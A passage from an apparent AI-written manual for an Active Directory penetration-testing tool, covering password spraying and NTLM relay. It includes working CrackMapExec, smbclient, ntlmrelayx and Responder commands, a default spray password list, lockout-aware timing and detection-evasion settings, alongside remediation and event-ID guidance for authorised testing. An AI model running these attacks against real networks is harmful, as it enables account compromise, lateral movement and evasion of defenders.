2. If legacy app requires PREAUTH_DISABLED, use strong 25+ character passwords

3. Monitor Event ID 4768 for AS_REQ without pre-auth
```

**OPSEC Considerations:**

- **Detection Likelihood:** **Low**
- **IOCs:** Multiple AS-REQ failures (Event ID 4768) with error code 0x19
- **Evasion:** Spread requests over time, use stealth mode jitter

**Next Steps:**

- Use cracked credentials for authentication
- Check admin privileges with `check_admin.py`
- Proceed to privilege escalation if not admin

---

### 4.3 Password Spraying

**Objective:** Test a small list of common passwords against all domain users to avoid account lockout while maximizing credential discovery.

> [!CAUTION] > **Account Lockout Risk:** Password spraying can trigger account lockouts if not executed carefully. ADBasher includes built-in lockout protection but always verify domain lockout policy before executing.

**Lockout Policy Detection:**

```bash
# Query domain lockout policy via CrackMapExec
crackmapexec smb 192.168.10.10 -u '' -p '' --pass-pol

# Expected output:
# Account Lockout Threshold: 5 invalid attempts
# Lockout Duration: 30 minutes
# Observation Window: 30 minutes

# Recommendation: Use max 3 password attempts with 35+ minute delays
```

**ADBasher Auto-Execution:**

```bash
# Runs automatically during credential attack phase
python3 "3 nopass/automated/password_spray.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain contoso.local \
  --dc-ip 192.168.10.10
```

**Behind the Scenes:**

```python
# ADBasher password spray logic:
# 1. Query database for enumerated users
# 2. Check domain lockout policy
# 3. Select safe password list (default: 7 common passwords)
# 4. Spray one password across all users
# 5. Wait lockout_duration + 5 minutes
# 6. Repeat for next password

# Default password list:
passwords = [
    "Password1",
    "Welcome1",
    "Summer2024",
    "Fall2024",
    "Password123",
    "Passw0rd!",
    "Company123"
]
```

**Manual Password Spraying:**

```bash
# Using CrackMapExec
crackmapexec smb 192.168.10.10 -u users.txt -p 'Password1' --continue-on-success

# Using Impacket
for user in $(cat users.txt); do
  smbclient -L 192.168.10.10 -U "contoso.local\\$user%Password1" 2>&1 | grep -q "session setup failed" || echo "$user:Password1"
  sleep 1
done
```

**Expected ADBasher Output:**

```
[INFO] Starting password spray attack
[+] Loaded 487 users from database
[+] Domain lockout policy: 5 attempts, 30 min lockout
[!] Using conservative spray: 3 passwords, 35 min delay between attempts
[+] Spraying password 1/3: Password1
[+] VALID: john.doe:Password1
[+] VALID: jane.smith:Password1
[+] Sleeping 35 minutes before next attempt...
[+] Spraying password 2/3: Welcome1
[+] VALID: bob.johnson:Welcome1
[+] Password spray complete
[+] Valid credentials: 3
[+] Stored in database, checking admin privileges...
```

**Success Metrics:**

- At least 1 valid credential discovered
- Zero account lockouts triggered
- Credentials automatically tested for admin privileges

**Attack Timing Visualization:**

```
Timeline (Lockout Policy: 5 attempts, 30 min window):

00:00 - Spray "Password1" (487 users, attempt 1)
35:00 - Spray "Welcome1" (487 users, attempt 2)
70:00 - Spray "Summer2024" (487 users, attempt 3)

Total duration: ~70 minutes for 3 passwords
Users locked out: 0 (assuming all started with 0 bad attempts)
```

**Common Errors and Solutions:**

| Error                  | Cause                           | Solution                                         |
| ---------------------- | ------------------------------- | ------------------------------------------------ |
| `clock_skew_too_great` | System time > 5 min off from DC | Sync time: `sudo ntpdate -s 192.168.10.10`       |
| `user_not_found`       | Username format incorrect       | Check format (DOMAIN\\user vs <user@domain.com>) |
| `account_locked_out`   | Lockout triggered               | Wait lockout duration, reduce attempts           |

**OPSEC Considerations:**

- **Detection Likelihood:** **Medium-High**
- **IOCs:**
  - Event ID 4625 (Failed logon) across multiple accounts
  - Same source IP for many authentication attempts
  - Failed attempts within short timeframe

**OPSEC Evasion:**

```bash
# Distribute attacks across multiple IPs (if available)
# ADBasher config.yaml:
evasion:
  rotate_source_ips: true
  source_ip_pool:
    - 192.168.5.100
    - 192.168.5.101
    - 192.168.5.102

# Use even longer delays in high-security environments
evasion:
  jitter_min: 60  # 1 hour minimum between sprays
  work_hours_only: true  # Only spray during business hours
```

**Next Steps:**

- Discovered credentials automatically cascade to privilege check
- If admin credentials found: Trigger post-exploitation
- If user credentials found: Proceed to Kerberoasting with valid auth

---

### 4.4 NTLM Relay Attacks

**Objective:** Relay captured NTLM authentication attempts to other systems to gain unauthorized access.

> [!WARNING] > **High Detection Risk:** NTLM relay attacks generate significant network anomalies and are often detected by modern EDR solutions. Use only in stealth-approved engagements.

**Prerequisites:**

- SMB signing disabled on target systems
- Ability to trigger NTLM authentication (responder, coercion attacks)

**Attack Flow:**

```
┌─────────────────────────────────────────────────────────┐
│            NTLM Relay Attack Flow                       │
├─────────────────────────────────────────────────────────┤
│ 1. Poison LLMNR/NBT-NS (Responder)                     │
│ 2. Victim attempts NetBIOS name resolution              │
│ 3. Victim sends NTLM auth to attacker                   │
│ 4. Attacker relays NTLM to target server                │
│ 5. If SMB signing off: Successful authentication        │
│ 6. Execute commands as relayed user                     │
└─────────────────────────────────────────────────────────┘
```

**Manual NTLM Relay (ntlmrelayx):**

```bash
# Step 1: Identify targets without SMB signing
crackmapexec smb 192.168.10.0/24 --gen-relay-list relay_targets.txt

# Step 2: Start ntlmrelayx
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

# Step 3: Trigger authentication via Responder
sudo responder -I eth0 -wrf

# Expected output when relay succeeds:
# [*] SMBD: Received connection from 192.168.10.50
# [*] Authenticating against smb://192.168.10.100 as CONTOSO/ADMIN
# [*] Command executed: nt authority\system
```

**ADBasher Integration:**

ADBasher does not auto-execute NTLM relay attacks due to high detection risk, but provides helper scripts:

```bash
# Check for relay-vulnerable hosts
python3 "4 mitm/check_smb_signing.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-range 192.168.10.0/24

# Start relay attack (manual)
cd "4 mitm"
./ntlm_relay_helper.sh --targets relay_targets.txt
```

**Success Metrics:**

- SMB signing disabled hosts identified
- NTLM authentication successfully relayed
- Code execution achieved on target

**Remediation (for reporting):**

```
Finding: SMB Signing Not Required
Severity: HIGH
Affected Hosts: 47/50 workstations, 3/12 servers

Recommendation:
1. Enable SMB signing via Group Policy:
   Computer Config → Policies → Windows Settings → Security Settings
   → Local Policies → Security Options
   Set "Microsoft network server: Digitally sign communications (always)" = Enabled

2. Disable LLMNR and NBT-NS:
   GPO: Computer Config → Admin Templates → Network → DNS Client
   Set "Turn off multicast name resolution" = Enabled
```

**OPSEC Rating:** **HIGH** - Generates unusual SMB traffic patterns, triggers EDR behavioral analytics.

**Next Steps (if successful):**

- Dump SAM hashes from relayed access
- Establish persistence if system-level access obtained
- Pivot to other systems using captured credentials

---

This completes Section 4. Due to length constraints, I'll continue with the remaining sections in the next part of the document.
